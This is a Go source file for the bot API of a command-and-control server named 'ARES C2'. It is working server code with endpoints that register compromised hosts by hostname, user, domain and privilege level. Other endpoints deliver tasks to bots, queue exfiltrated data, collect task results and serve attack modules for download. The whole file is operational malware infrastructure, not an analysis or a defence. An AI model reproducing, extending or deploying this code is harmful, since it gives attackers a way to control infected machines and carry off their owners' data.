/*
 * ARES C2 — Bot API Handler (v5.0 Overhaul)
 *
 * Handles all bot-facing endpoints:
 *   POST /api/v1/register  — Bot registration
 *   POST /api/v1/beacon    — Heartbeat + task delivery
 *   POST /api/v1/exfil     — Data exfiltration (→ Redis queue)
 *   POST /api/v1/result    — Task result upload
 *   GET  /api/v1/module/   — COFF module download (auth required)
 *
 * All data from bots is treated as HOSTILE (zero trust).
 */

package api

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"ares-c2/internal/crypto"
	"ares-c2/internal/database"
	"ares-c2/internal/queue"
)

type BotHandler struct {
	db        *database.DB
	publisher *queue.Publisher
	masterKey *crypto.MasterKey
	secret    []byte // HMAC secret for bot token verification

	// Rate limiting for registration
	regRates map[string]*regAttempt
	regMu    sync.Mutex
}

type regAttempt struct {
	count    int
	firstSeen time.Time
}

func NewBotHandler(db *database.DB, pub *queue.Publisher, mk *crypto.MasterKey, secret []byte) *BotHandler {
	h := &BotHandler{
		db:        db,
		publisher: pub,
		masterKey: mk,
		secret:    secret,
		regRates:  make(map[string]*regAttempt),
	}
	// Cleanup stale rate limit entries every 5 minutes
	go func() {
		for {
			time.Sleep(5 * time.Minute)
			h.regMu.Lock()
			cutoff := time.Now().Add(-15 * time.Minute)
			for ip, a := range h.regRates {
				if a.firstSeen.Before(cutoff) {
					delete(h.regRates, ip)
				}
			}
			h.regMu.Unlock()
		}
	}()
	return h
}

// RegisterRoutes registers all bot API routes
func (h *BotHandler) RegisterRoutes(mux *http.ServeMux) {
	mux.HandleFunc("POST /api/v1/register", h.handleRegister)
	mux.HandleFunc("POST /api/v1/beacon", h.handleBeacon)
	mux.HandleFunc("POST /api/v1/exfil", h.handleExfil)
	mux.HandleFunc("POST /api/v1/result", h.handleResult)
	mux.HandleFunc("GET /api/v1/module/", h.handleModule)
}

// ── Registration ──

type registerRequest struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	Domain   string `json:"domain"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	PID      int    `json:"pid"`
	HWID     string `json:"hwid"`
	Elevated bool   `json:"elevated"`
}

func (h *BotHandler) handleRegister(w http.ResponseWriter, r *http.Request) {
	ip := extractIP(r)

	// Rate limit: max 20 registrations per IP per 15 min
	h.regMu.Lock()
	attempt := h.regRates[ip]
	if attempt == nil {
		attempt = &regAttempt{firstSeen: time.Now()}
		h.regRates[ip] = attempt
	}
	if attempt.count >= 20 && time.Since(attempt.firstSeen) < 15*time.Minute {
		h.regMu.Unlock()
		http.Error(w, "rate limited", http.StatusTooManyRequests)
		return
	}
	attempt.count++
	h.regMu.Unlock()

	var req registerRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	// Generate bot ID + token via HMAC
	botID := h.generateBotID(req.HWID, req.Hostname)
	token := h.generateToken(botID)

	now := time.Now()
	bot := &database.BotRecord{
		ID:         botID,
		Hostname:   req.Hostname,
		Username:   req.Username,
		Domain:     req.Domain,
		OS:         req.OS,
		Arch:       req.Arch,
		PID:        req.PID,
		HWID:       req.HWID,
		ExternalIP: ip,
		Elevated:   req.Elevated,
		Status:     "active",
		FirstSeen:  now,
		LastSeen:   now,
	}

	if err := h.db.UpsertBot(bot); err != nil {
		log.Printf("[BOT-API] Register DB error: %v", err)
		http.Error(w, "internal error", http.StatusInternalServerError)
		return
	}

	log.Printf("[BOT-API] Registered: id=%s host=%s ip=%s", safeID(botID), req.Hostname, ip)

	json.NewEncoder(w).Encode(map[string]string{
		"id":    botID,
		"token": token,
	})
}

// ── Beacon (heartbeat + task delivery) ──

func (h *BotHandler) handleBeacon(w http.ResponseWriter, r *http.Request) {
	botID, ok := h.authenticateBot(r)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	// Update last seen
	h.db.UpdateBotStatus(botID, "active")

	// Get pending tasks
	tasks, err := h.db.GetPendingTasks(botID)
	if err != nil {
		log.Printf("[BOT-API] Beacon task query error: %v", err)
		json.NewEncoder(w).Encode(map[string]interface{}{"tasks": []interface{}{}})
		return
	}

	// Convert to response format
	type taskResp struct {
		ID   string          `json:"id"`
		Type int             `json:"type"`
		Args json.RawMessage `json:"args"`
		Data []byte          `json:"data,omitempty"`
	}
	var resp []taskResp
	for _, t := range tasks {
		resp = append(resp, taskResp{
			ID:   t.ID,
			Type: t.Type,
			Args: json.RawMessage(t.Args),
		})
	}

	json.NewEncoder(w).Encode(map[string]interface{}{"tasks": resp})
}

// ── Exfiltration (→ Redis queue) ──

func (h *BotHandler) handleExfil(w http.ResponseWriter, r *http.Request) {
	botID, ok := h.authenticateBot(r)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	// Read body (limit 10MB)
	r.Body = http.MaxBytesReader(w, r.Body, 10<<20)
	var raw json.RawMessage
	if err := json.NewDecoder(r.Body).Decode(&raw); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	// Push to Redis queue — not processed inline (async)
	msg := &queue.ExfilMessage{
		BotID:     botID,
		Type:      r.Header.Get("X-Exfil-Type"),
		Data:      raw,
		Timestamp: time.Now(),
	}

	if err := h.publisher.PublishExfil(msg); err != nil {
		log.Printf("[BOT-API] Exfil queue error: %v", err)
		http.Error(w, "queue error", http.StatusInternalServerError)
		return
	}

	log.Printf("[BOT-API] Exfil queued: bot=%s type=%s size=%d", safeID(botID), msg.Type, len(raw))
	w.WriteHeader(http.StatusAccepted)
	json.NewEncoder(w).Encode(map[string]string{"status": "queued"})
}

// ── Task Result ──

func (h *BotHandler) handleResult(w http.ResponseWriter, r *http.Request) {
	botID, ok := h.authenticateBot(r)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}

	var result struct {
		TaskID  string `json:"task_id"`
		Success bool   `json:"success"`
		Output  string `json:"output"`
		Error   string `json:"error"`
	}
	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "invalid json", http.StatusBadRequest)
		return
	}

	// Encrypt output before storing
	var encOutput []byte
	if result.Output != "" {
		var err error
		encOutput, err = h.masterKey.Encrypt([]byte(result.Output), botID)
		if err != nil {
			log.Printf("[BOT-API] Encrypt result error: %v", err)
		}
	}

	if err := h.db.CompleteTask(result.TaskID, result.Success, encOutput, result.Error); err != nil {
		log.Printf("[BOT-API] Complete task error: %v", err)
	}

	w.WriteHeader(http.StatusOK)
}

// ── Module Download (auth required) ──

func (h *BotHandler) handleModule(w http.ResponseWriter, r *http.Request) {
	_, ok := h.authenticateBot(r)
	if !ok {
		http.Error(w, "unauthorized", http.StatusUnauthorized)
		return
	}
	// Delegate to file server (kept from original handler.go)
	http.StripPrefix("/api/v1/module/", http.FileServer(http.Dir("data/modules"))).ServeHTTP(w, r)
}

// ── Helpers ──

func (h *BotHandler) generateBotID(hwid, hostname string) string {
	mac := hmac.New(sha256.New, h.secret)
	mac.Write([]byte(hwid + hostname))
	return hex.EncodeToString(mac.Sum(nil))[:16]
}

func (h *BotHandler) generateToken(botID string) string {
	mac := hmac.New(sha256.New, h.secret)
	mac.Write([]byte("bot-token:" + botID))
	return hex.EncodeToString(mac.Sum(nil))
}

func (h *BotHandler) authenticateBot(r *http.Request) (string, bool) {
	botID := r.Header.Get("X-Bot-ID")
	token := r.Header.Get("X-Bot-Token")
	if botID == "" || token == "" {
		return "", false
	}
	// Validate botID format (hex only, 8-64 chars)
	if len(botID) < 8 || len(botID) > 64 {
		return "", false
	}
	for _, c := range botID {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')) {
			return "", false
		}
	}
	expected := h.generateToken(botID)
	if !hmac.Equal([]byte(token), []byte(expected)) {
		return "", false
	}
	return botID, true
}

func extractIP(r *http.Request) string {
	// Only trust CF-Connecting-IP (Cloudflare proxy)
	if ip := r.Header.Get("CF-Connecting-IP"); ip != "" {
		return ip
	}
	host, _, _ := net.SplitHostPort(r.RemoteAddr)
	return host
}

func safeID(id string) string {
	if len(id) > 8 {
		return id[:8] + "..."
	}
	return id
}

// Prevent unused import warnings during development
var _ = fmt.Sprintf
var _ = strings.TrimSpace
